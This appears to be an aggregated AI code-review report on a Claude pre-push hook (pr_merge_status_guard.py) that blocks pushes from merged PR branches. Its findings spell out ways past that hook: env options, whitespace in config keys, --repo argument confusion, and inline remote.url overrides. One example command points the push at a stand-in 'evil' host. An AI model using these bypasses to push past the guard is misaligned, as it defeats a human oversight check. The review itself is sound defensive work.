  PROBLEM: Both Git-invocation parsers stop at `env` options or unrecognized env command forms, so they can miss a following `git push` and allow it without guard evaluation.
  WHY: This is a blocker according to google_gemini-3_8-flash and z-ai_glm-5_2, and major according to deepseek_deepseek-v4-pro, openai_gpt-6-luna, and qwen_qwen3_7-plus; valid forms such as `env -u`, `env -i`, or `env --` can hide the push.
- .claude/hooks/pr_merge_status_guard.py: lines 573-574 | severity=critical | confidence=[5]
  flagged_by: [google_gemini-3_8-flash]
  PROBLEM: When `remote_provided` and `invocation.config` are both present, `_push_targets` treats positional arguments as refspecs without checking whether the first is an inline-configured remote.
  WHY: `git push --repo=origin main` can treat `main` as the repository argument, causing the guard to check the base branch instead of the merged current branch and allow the push.
- .claude/hooks/pr_merge_status_guard.py: lines 491-512 | severity=high | confidence=[5]
  flagged_by: [deepseek_deepseek-v4-pro, google_gemini-3_8-flash, z-ai_glm-5_2]
  PROBLEM: `_inline_push_config_block` does not strip whitespace from configuration keys or their dot-separated components before matching.
  WHY: Git accepts whitespace around configuration key names, so spaced forms of `remote.<name>.push`, `pushurl`, or related blocked keys can evade the filter.
- .claude/hooks/pr_merge_status_guard.py: lines 1525-1538 | severity=high | confidence=[5]
  flagged_by: [google_gemini-3_8-flash]
  PROBLEM: Push repository identity resolution does not consistently use inline `remote.<name>.url` configuration for an existing remote.
  WHY: The guard can resolve the saved repository URL instead of the URL Git will use for the push, causing PR status to be checked against the wrong repository.
- .claude/hooks/pr_merge_status_guard.py: lines 217-224 | severity=high | confidence=[4]
  flagged_by: [deepseek_deepseek-v4-pro, google_gemini-3_8-flash, openai_gpt-6-luna]
  PROBLEM: `_run` forwards captured inline Git configuration to internal Git subprocesses, including network-facing history-fallback commands.
  WHY: Untrusted configuration can alter those subprocesses' network behavior or execute a configured SSH command before the push authorization decision.
- .claude/hooks/pr_merge_status_guard.py: _evaluate_bash, new lines 1631-1634 | severity=low | confidence=[3]
  flagged_by: [deepseek_deepseek-v4-pro]
  PROBLEM: The catch-all guard independently calls `_guarded_git_invocations` a second time after the main loop has already processed the invocations.
  WHY: The repeated parse is harmless today, but could diverge if parsing later gains stateful behavior and cause the catch-all to miss an inline-config push.

=== FINDINGS FROM deepseek_deepseek-v4-pro ===
- .claude/hooks/pr_merge_status_guard.py (and workflow-templates twin): new lines 499-512 | severity=high | confidence=[4]
  PROBLEM: The function splits config keys on "." without stripping whitespace from the key or its dot-separated segments.
  WHY: Git's config parser normalizes whitespace around section and key names, so a key like "remote .   origin . push" produces field = " push" which does not match "push". A push command with git -c "remote . origin . push"="refs/heads/feature/x:refs/heads/main" push origin would bypass the guard's redirection filter and push the merged feature branch.
- .claude/hooks/pr_merge_status_guard.py (and workflow-templates twin): new lines 406-415; new lines 814-820 | severity=high | confidence=[4]
  PROBLEM: The env token handler only consumes tokens matching ^[A-Za-z_][A-Za-z0-9_]*= after env.
  WHY: Options like -u, -i, --, or -C cause the while loop to exit immediately, the git token is never reached, and the entire invocation is silently dropped. For example, env -u _ GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://evil/x.git git push origin feature/x would be skipped by both parsers.
- .claude/hooks/pr_merge_status_guard.py (and workflow-templates twin): new lines 1631-1634 | severity=low | confidence=[3]
  PROBLEM: The catch-all guard calls _guarded_git_invocations(command, checkout) a second time independently of the main loop that already processed every invocation.
  WHY: Today the redundant call is harmless, but if _guarded_git_invocations gains stateful behavior, the catch-all could miss an inline-config push that the main loop already consumed.
- .claude/hooks/pr_merge_status_guard.py (and workflow-templates twin): new lines 217-224 | severity=high | confidence=[3]
  PROBLEM: _run injects all captured inline -c options into every git subprocess executed inside _git_environment(..., invocation.config), including git ls-remote and git fetch during history fallback.
  WHY: _inline_push_config_block does not filter credential.helper, core.gitProxy, protocol.allow, http.proxy, or other settings that alter network behavior; a crafted inline config could make the guard query a hostile server and return spoofed branch data.

=== FINDINGS FROM google_gemini-3_8-flash ===
- .claude/hooks/pr_merge_status_guard.py: lines 573-574 (and workflow-templates/.claude/hooks/pr_merge_status_guard.py:573-574) | severity=critical | confidence=[5]
  PROBLEM: When remote_provided and invocation.config are both present, _push_targets unconditionally sets refspecs = positionals rather than checking whether the first positional argument is an inline-configured remote repository.
  WHY: For a command like "git -c remote.main.url=<url> -c push.default=current push --repo=origin main", Git treats "main" as the positional repository argument (which overrides --repo) and pushes the current branch ("feature/x") with no command-line refspecs. Because lines 573-574 force "main" to be treated as a refspec, the guard matches "main" against base ("main"), skips checking the merged status of "feature/x", and allows a push from a merged feature branch to proceed unchecked. This directly preserves the exploit scenario described in issue #6336.
- .claude/hooks/pr_merge_status_guard.py: lines 409-418 and 817-821 (and workflow-templates/.claude/hooks/pr_merge_status_guard.py:409-418, 817-821) | severity=high | confidence=[5]
  PROBLEM: The env parser in _guarded_git_invocations and git_subcommands only matches exact token "env" followed immediately by "NAME=" assignments. It does not handle env options (such as "--", "-u", "-i", "-C") or "/usr/bin/env".
  WHY: When any env option precedes the command or assignments, or the prefix is /usr/bin/env, the parser stops scanning before reaching "git"; git_subcommands() returns an empty set and _evaluate_bash() allows the command without evaluating guards.
- .claude/hooks/pr_merge_status_guard.py: lines 496-512 (and workflow-templates/.claude/hooks/pr_merge_status_guard.py:496-512) | severity=high | confidence=[5]
  PROBLEM: _inline_push_config_block splits config keys on "=" and "." without stripping surrounding whitespace.
  WHY: Git normalizes and strips whitespace around configuration key names, so leading or trailing whitespace prevents dangerous push-redirection keys from matching and allows them to bypass the configuration block.
- .claude/hooks/pr_merge_status_guard.py: lines 1528-1530 (and workflow-templates/.claude/hooks/pr_merge_status_guard.py:1528-1530) | severity=high | confidence=[5]
  PROBLEM: The guard queries "git remote get-url --push" using only target.environment without passing target.config.
  WHY: When an existing remote URL is overridden inline, the guard resolves the saved repository URL rather than the inline URL Git will actually use, so PR status is checked against the wrong repository.
- .claude/hooks/pr_merge_status_guard.py: lines 1525-1538 (and workflow-templates/.claude/hooks/pr_merge_status_guard.py:1525-1538) | severity=high | confidence=[5]
  PROBLEM: The logic assumes Git push ignores inline remote.<name>.url overrides for existing remotes and only uses inline config for newly defined remotes.
  WHY: Git command-line -c options override configuration values from repository and global config files; resolving push_slug from the un-overridden local configuration leads to incorrect repository identity during PR evaluation.
